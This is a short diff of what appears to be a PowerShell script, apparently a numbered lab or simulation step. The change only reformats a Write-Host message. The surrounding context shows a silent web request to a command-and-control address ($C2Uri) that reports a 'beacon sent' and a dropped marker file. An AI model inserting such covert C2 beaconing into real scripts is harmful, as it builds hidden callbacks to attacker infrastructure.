@@ -19,4 +19,4 @@ try {
     Invoke-WebRequest -Uri $C2Uri -Method GET -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-Write-Host "[L8] Beacon sent to $C2Uri — marker dropped at $markerFile"
+Write-Host ("[L8] Beacon sent to " + $C2Uri + " - marker dropped at " + $markerFile)
